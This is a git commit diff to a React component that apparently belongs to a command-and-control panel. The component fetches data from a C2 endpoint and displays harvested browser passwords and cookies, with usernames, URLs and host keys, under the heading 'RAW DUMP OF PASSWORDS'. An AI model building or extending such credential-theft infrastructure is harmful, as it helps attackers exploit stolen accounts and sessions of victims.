33c86a7c3536edf0f6d645e5e64064b34c8eda11
Ingi-Hong <ingihong@bu.edu>
2022-12-18 20:52:59 -0500

    made passwords readable

--- client/src/Components/Passworddisplay.js
+++ client/src/Components/Passworddisplay.js
@@ -1,17 +1,21 @@
-import { useEffect, useState, useCallback } from "react";
+import { useEffect, useState } from "react";
+import "./Stylesheets/passworddisplay.css"
 
 function Passworddisplay(props) {
-  const [cookies, setCookies] = useState();
-  const [passwords, setPasswords] = useState();
-  const [loading, setIsLoading] = useState();
+  const [cookies, setCookies] = useState([
+    { task_id: "", path: "", hostkey: "", value: "" },
+  ]);
+  const [passwords, setPasswords] = useState([
+    { task_id: "", path: "", url: "", username: "", password: "" },
+  ]);
+  const [loading, setIsLoading] = useState(true);
   const [error, setError] = useState();
   const [message, setMessage] = useState();
-  
-  let id = props.id
-  console.log("Id: " + id)
+
+  let id = props.id;
 
   async function getData(id) {
-    console.log("get data called")
+    setIsLoading(true);
     try {
       let response = await fetch(
         process.env.REACT_APP_C2URL + "/display_passwords",
@@ -27,7 +31,6 @@ function Passworddisplay(props) {
       let respJSON = await response.json();
       let data = respJSON;
 
-      console.log("data.passwords: " + data.passwords)
       setPasswords(data.passwords);
       setCookies(data.cookies);
       if (response.status === 200) {
@@ -35,23 +38,42 @@ function Passworddisplay(props) {
         setMessage("Error getting data");
       }
     } catch (error) {
-      console.log("error: " + error.message)
+      console.log("error: " + error.message);
       setError(error.message);
+    } finally {
+      setIsLoading(false);
     }
-  };
+  }
 
   useEffect(() => {
-    getData(id)
-}, [id])
+    getData(id);
+  }, [id]);
 
-  if (loading) return <div></div>
+  if (loading) return <div></div>;
+
   return (
-    <div>
-      <ul>
-        <li>{JSON.stringify(cookies)}</li>
-
-        <li>{JSON.stringify(passwords)}</li>
-      </ul>
+    <div className="container">
+      <h1>RAW DUMP OF PASSWORDS</h1>
+      <h2>Passwords</h2>
+      <div className="columns">
+        {passwords.map((row, iterator) => (
+          <div key={iterator} className="column col-12 tiny-text">
+            <div className="divider"></div>
+        
+            <b>ID: </b>{row.task_id} <b>Path: </b> {row.path} <b>URL: </b> {row.url} <b>USERNAME: {row.username} </b> <b>PASSWORD: {row.password} </b>
+          </div>
+        ))}
+      </div>
+      <h2>Cookies</h2>
+      <div className="columns">
+        {cookies &&
+          cookies.map((row, iterator) => (
+            <div key={iterator} className="column col-12 tiny-text">
+              <div className="divider"></div>
+              <b>Task ID: </b>{row.task_id} <b>Path: </b> {row.path} <b>Hostkey: </b>{row.hostkey} <b>Value: {row.value}</b>
+            </div>
+          ))}
+      </div>
     </div>
   );
 }
